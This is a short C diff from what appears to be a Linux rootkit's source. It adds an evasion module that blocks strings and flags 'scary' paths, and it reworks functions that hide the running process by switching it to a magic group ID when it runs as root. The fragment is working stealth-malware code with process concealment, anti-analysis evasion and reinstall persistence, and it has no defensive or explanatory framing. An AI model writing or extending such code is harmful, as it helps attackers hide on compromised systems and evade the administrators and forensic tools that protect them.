@@ -3,7 +3,13 @@
 
 #include "files/files.h"
 
-#ifdef DO_REINSTALL
+#ifdef BLOCK_STRINGS
+int scary_path(char *string);
+int block_strings(char *const argv[]);
+#include "evasion/block_strings.c"
+#endif
+
+#if defined(DO_EVASIONS) && defined(DO_REINSTALL)
 #include "evasion/evasion.h"
 #endif
 
@@ -31,24 +37,20 @@ void _setgid(gid_t gid){
 }
 
 void hide_self(void){
-    #ifndef HIDE_SELF
+#ifndef HIDE_SELF
     return;
-    #endif
+#endif
 
-    get_process_info();
-    if(not_user(0) ||
-       process_info.mygid == MAGIC_GID) return;
+    if(not_user(0) || getgid() == MAGIC_GID) return;
     _setgid(MAGIC_GID);
 }
 
 void unhide_self(void){
-    #ifndef HIDE_SELF
+#ifndef HIDE_SELF
     return;
-    #endif
+#endif
 
-    get_process_info();
-    if(not_user(0) ||
-       process_info.mygid == 0) return;
+    if(not_user(0) || getgid() == 0) return;
     _setgid(0);
 }
 
